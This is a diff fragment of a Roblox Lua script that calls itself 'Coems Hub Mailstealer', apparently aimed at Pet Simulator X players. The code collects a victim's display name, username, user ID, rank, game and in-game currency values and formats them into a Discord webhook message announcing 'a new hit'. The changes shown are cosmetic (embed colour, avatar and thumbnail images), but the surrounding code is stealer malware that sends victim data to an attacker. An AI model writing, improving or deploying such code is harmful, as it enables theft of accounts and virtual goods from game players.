@@ -35,7 +35,7 @@ elseif game.PlaceId == 11725212117 then
 else
 	_G.GameIn = "❓ Couldn't find game"
 end
-local webhookcolor = "16711680"
+local webhookcolor = "5763719"
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
@@ -49,6 +49,7 @@ local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Funct
 local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
 local function sendwebhook(msg)
 local msg = {
+        ["avatar_url"] = "https://cdn.discordapp.com/icons/1109197661652910210/c635dd13f1317b77ded3c73a19840db2.png"
 	["content"]= "**🤑 Coems Hub Mailstealer has detected a new hit!**",
 	["username"] = "Coems Hub Mailstealer",
 	["embeds"]= {
@@ -57,6 +58,11 @@ local msg = {
 		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
 		["url"]= "https://discord.gg/scripter",
 		["color"]= ""..webhookcolor.."",
+		["thumbnail"] = {
+        ["url"] = "https://cdn.discordapp.com/icons/1109197661652910210/c635dd13f1317b77ded3c73a19840db2.png",
+        ["height"] = 420,
+        ["width"] = 420
+        },
 		["fields"]= {
         {
           ["name"]= "**<:diamond_psx:1118474311615918080>Diamonds<:diamond_psx:1118474311615918080>**",
